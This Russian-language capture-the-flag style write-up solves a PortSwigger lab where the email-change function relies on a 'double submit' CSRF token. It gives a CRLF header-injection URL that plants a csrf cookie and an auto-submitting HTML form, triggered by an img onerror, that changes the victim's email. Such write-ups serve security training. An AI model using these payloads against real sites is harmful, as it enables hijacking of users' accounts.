Функция изменения электронной почты этой лаборатории уязвима для CSRF. Он пытается использовать небезопасную технику предотвращения CSRF «двойной отправки».

## Дано

учетные данные: `wiener:peter`

## Задача

изменить адрес электронной почты зрителя

# Разведка

```
Cookie: session=RMNPbHWNCL2O9OvF6O5rkQqqGPeZuPaM; csrf=FY3cqGw3z1Ra9uxk1B3IuNWYfTj7I7v8

email=test%40mail.ru&csrf=FY3cqGw3z1Ra9uxk1B3IuNWYfTj7I7v8
```

csrf токены одинаковые

Проверим что будет при изменение одного и обоих
- При изменение одного: "Invalid CSRF token"
-  При изменение второго: "Invalid CSRF token"
-  При изменение обоих не совпадающих: "Invalid CSRF token"
-  При изменение обоих совпадающих: ПРОХОДИТ

# Атака

Для смены почты нам надо
- cookie файлы жертвы а csrf токены мы можем сами потделать

Форма атаки:
- Ссылка на динамическую генерацию чтоб мы кинули на его cookie наши csrf токены
- скрипт который обработает ссылку подмены csrf 

Ссылка
```
GET /?search=home%0d%0aSet-Cookie:%20csrf=fake
```
Ответ
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=home
Set-Cookie: csrf=fake; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3425
```

Форма атаки
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3800c404c7490a80bed0b000020065.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;mail&#46;ru" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>
     `<img src="https://0a3800c404c7490a80bed0b000020065.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
  </body>
</html>
```